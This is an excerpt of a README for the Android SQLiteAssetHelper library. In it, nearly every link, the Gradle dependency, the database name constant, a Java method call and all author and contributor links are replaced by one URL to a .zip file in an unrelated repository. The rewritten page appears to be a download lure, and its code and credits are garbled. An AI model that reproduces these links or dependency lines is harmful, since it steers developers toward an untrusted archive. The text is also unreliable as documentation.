...
If you are using the Gradle build system, simply add the following dependency in your `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip` file:

```groovy
dependencies {
    compile 'https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip+'
}
```
...
SQLiteAssetHelper is intended as a drop in alternative for the framework's [SQLiteOpenHelper](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip). Please familiarize yourself with the behaviour and lifecycle of that class.
...
public class MyDatabase extends SQLiteAssetHelper {
    ...
    private static final String DATABASE_NAME = "https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip";
...
For the example above, the project would contain the following:
    ...
    https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip
...
* ZIP: `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip` (a single SQLite database file must be the only file within the archive)
* GZIP: `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip`
...
```java
super(context, DATABASE_NAME, https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip(null).getAbsolutePath(), null, DATABASE_VERSION);
```
...
The [samples:database-v1](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip) project demonstrates a simple database creation and usage example using the classic Northwind database.
...
For example, [https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip) upgrades the database named "https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip" from version 1 to 2. You can include multiple upgrade files to upgrade between any two given versions.
...
The [samples:database-v2-upgrade](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip) project demonstrates a simple upgrade to the Northwind database which adds a FullName column to the Employee table.

### Generating upgrade scripts

You can use 3rd party tools to automatically generate the SQL required to modify a database from one schema version to another. One such application is [SQLite Compare Utility](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip) for Windows.
...
####Author:
  ...
  * [Jeff Gilfelt](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip)

#### Contributors:

  * [Alexandros Schillings](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip)
  * [Cyril Mottier](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip)
  * [Jon Adams](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip)
  * [Kevin](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip)
...
-------
 ...
 [1]: https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/gradle/sqlite-android-helper-asset-v3.6-alpha.1.zip
